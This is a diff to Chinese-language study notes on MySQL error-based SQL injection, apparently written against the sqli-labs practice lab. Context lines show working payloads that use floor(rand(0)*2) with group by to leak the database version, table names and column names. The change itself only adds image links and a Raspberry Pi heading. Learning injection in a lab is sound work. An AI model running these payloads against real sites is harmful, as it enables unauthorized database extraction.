@@ -82,15 +82,15 @@ payload:`?id=777')`
 上面的这条SQL将报错: Duplicate entry '1' for key 'group_key'
 如下图
 
-![img1]()
+![img1](https://raw.githubusercontent.com/largewaste/cqr/master/imgs(copied%20from%20other%20places)/1.png)
 
 原因：  
 
 rand(0)是把0作为生成随机数的种子。首先明确一点，无论查询多少次，无论在哪台MySQL Server上查询，连续rand(0)生成的序列是固定的。
 
-![img2]()
+![img2](https://raw.githubusercontent.com/largewaste/cqr/master/imgs(copied%20from%20other%20places)/2.png)
 
-![img3]()
+![img3](https://raw.githubusercontent.com/largewaste/cqr/master/imgs(copied%20from%20other%20places)/3.png)
 
 
 --------
@@ -107,7 +107,7 @@ version()可以替换为需要查询的信息。
 ①`union select 1,2,count(*)  from information_schema.columns group by concat(version(),floor(rand(0)*2));–+`
 
 搞到库名  
-![img4]()  
+![img4](https://raw.githubusercontent.com/largewaste/cqr/master/imgs(copied%20from%20other%20places)/4.png)  
 
 ②`Union select 1,count(*),concat((select table_name from information_schema.tables where table_schema='security' limit 3,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+`  
 ③`Union select 1,count(*),concat((select column_name from information_schema.columns where table_schema='security' and table_name='users' limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x;--+`
@@ -126,5 +126,6 @@ version()可以替换为需要查询的信息。
 把vnc打开即可远程连接  
 
 
+### 重置树莓派密码跟用户
 
 
